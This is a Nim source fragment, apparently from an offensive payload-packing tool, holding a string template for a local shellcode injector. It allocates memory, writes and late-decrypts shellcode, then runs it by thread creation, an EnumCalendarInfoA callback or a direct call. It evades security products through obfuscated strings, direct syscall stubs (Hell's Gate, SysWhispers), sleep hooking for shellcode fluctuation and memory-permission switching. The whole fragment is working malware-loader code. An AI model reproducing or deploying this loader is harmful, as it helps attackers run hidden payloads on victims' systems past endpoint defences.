let LocalInjectStub*  = """

    proc Wait(): void =
        when defined(wait):
            when defined(verbose):
                echo obf("Waiting for process to finish via WaitForSingleObject")
            WaitForSingleObject(-1, -1)
        else:
            discard

    proc pwndem[byte](friendlycode: openarray[byte]): void =

        when defined(Fluctuate):
            g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
            g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
            # Will change the hardcoded key later on
            when defined(amd64):
                g_fluctuationData.encodeKey = 0x1337DE4D
            when defined(i386):
                g_fluctuationData.encodeKey = 0x1337
            g_fluctuationData.currentlyEncrypted = false
            g_fluctuationData.protect = PAGE_READWRITE
            g_fluctuate = FluctuateToRW
            if (hookSleep()):
                when defined(verbose):
                    echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
            else:
                when defined(verbose):
                    echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

        var pHandle: HANDLE = -1
            
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
            
        when defined(GetSyscallStub):
            let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
            var oldProtection: DWORD = 0
            var success: BOOL

            # define NtAllocateVirtualMemory
            let NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
            when defined(DInvoke):
                success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
            else:
                success = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
            # define NtWriteVirtualMemory
            let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
            when defined(DInvoke):
                success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
            else:
                success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

            success = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
            success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
            when defined(LocalCreateThread):
                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
                # define NtCreateThreadEx
                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
                VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
                success = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreate))
            when defined(RX):
                var syscallStub_NtProtect: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE*2)
                # define NtProtectVirtualMemory
                let NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
                VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
                success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
            

        when defined(Hellsgate):
            if getSyscall(ntAllocTable):
                syscall = ntAllocTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
        
        var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
        when defined(RX):
            protectionValue = PAGE_READWRITE
        when defined(RWX):
            protectionValue = PAGE_EXECUTE_READWRITE
        
        when defined(SysWhispers):
            status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
        else:
            status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)

        
            
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to allocate memory.")
                quit(1)
        else:
            when defined(verbose):
                when defined(RX):
                    echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
                else:
                    echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")
                
        var bytesWritten: SIZE_T
        when defined(Hellsgate):
            var 
                ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
                ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
    
            if getSyscall(ntWriteTable):

                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
        when defined(SysWhispers):
            status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
        else:       
            status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to write memory.")
                quit(1)
        else:
            when defined(verbose):
                echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"

        when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
            when defined(sleepinbetween):
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            ptrEncText = cast[ptr byte](buffer)
            ptrDecText = cast[ptr byte](buffer)
            decryptLate()
        
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

            when defined(syswhispers):
                status = uashdiasdj(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
            else:
                status = NtProtectVirtualMemory(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
            when defined(verbose):
                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                if (status == 0):
                    echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
            if (status != 0):
                when defined(verbose):
                    echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
                quit(1)

        when defined(LocalCreateThread):
            var tHandle: HANDLE
            when defined(SysWhispers):
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
                NtWaitForSingleObject(tHandle, 0, nil)
                Wait()
                status = zuatzuastdiasyy(tHandle)
                status = zuatzuastdiasyy(pHandle)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
            else:    
                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                when not defined(RX):
                    when defined(sleepinbetween):
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                    ptrEncText = cast[ptr byte](buffer)
                    ptrDecText = cast[ptr byte](buffer)
                    decryptLate()
                status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                nil, 
                -1,
                buffer, 
                nil, FALSE, 0, 0, 0, nil)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
                # Somehow not working
                #var TimeOut: LARGE_INTEGER = cast[LARGE_INTEGER](-1)
                #NtWaitForSingleObject(-1, 0, &TimeOut)
                Wait()
            when defined(Hellsgate):
                when defined(Hellsgate):
                    if getSyscall(ntCloseTable):
                        syscall = ntCloseTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtClose")
            status = NtClose(tHandle)
            status = NtClose(pHandle)
            return
            
        when defined(Callback):
            when not defined(RX):
                when defined(sleepinbetween):
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                ptrEncText = cast[ptr byte](buffer)
                ptrDecText = cast[ptr byte](buffer)
                decryptLate()
            discard EnumCalendarInfoA(cast[CALINFO_ENUMPROCA](buffer),1,1,1)
            Wait()
        else:
            when not defined(RX):
                when defined(sleepinbetween):
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                ptrEncText = cast[ptr byte](buffer)
                ptrDecText = cast[ptr byte](buffer)
                decryptlate()
            let f = cast[proc(){.nimcall.}](buffer)
            f()
            Wait()

    pwndem(enctext)
    return 0

when not defined(proxy):
    when not defined(service):
        when not defined(cloned):
            discard main(nil)

when defined(defaultMain):
    when not defined(service):
        when not defined(cloned):
            discard main(nil)
"""
